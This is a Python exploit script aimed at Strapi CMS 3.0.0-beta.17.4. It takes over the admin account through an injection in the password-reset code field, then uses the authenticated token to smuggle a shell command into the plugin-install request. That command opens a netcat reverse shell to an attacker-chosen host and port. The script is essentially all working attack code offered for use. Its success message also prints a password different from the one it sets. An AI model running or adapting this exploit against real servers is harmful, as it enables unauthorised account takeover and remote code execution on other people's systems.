#!/usr/bin/env python3

import requests
import json
from cmd import Cmd
import sys

if len(sys.argv) != 4:
    print("[-] Wrong number of arguments provided")
    print("[*] Usage: python3 exploit.py <URL> <LHOST> <LPORT>\n")
    sys.exit()


class Terminal(Cmd):
    prompt = "$> "
    def default(self, args):
        code_exec(args)

def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")


def password_reset():
    global url, jwt, newpassword
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : newpassword,
            "passwordConfirmation" : newpassword
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")

def exec_revshell():
    global jwt, url, LHOST, LPORT
    print("[+] Triggering Remote code execution")
    headers = {
            'Authorization': f'Bearer {jwt}',
            }
    json_data = {
            'plugin':f'documentation && $(touch /tmp/f;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f)',
            'port':"1337"
            }
    resp = requests.post(
    f"{url}/admin/plugins/install", headers=headers, json=json_data
            )
    print(resp)
    print(resp.text)

if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    assert url.startswith("http"), "Provide url schema such as http:// ot https://"
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    newpassword="VeryStrongPassw1"
    check_version()
    password_reset()
    exec_revshell()
    
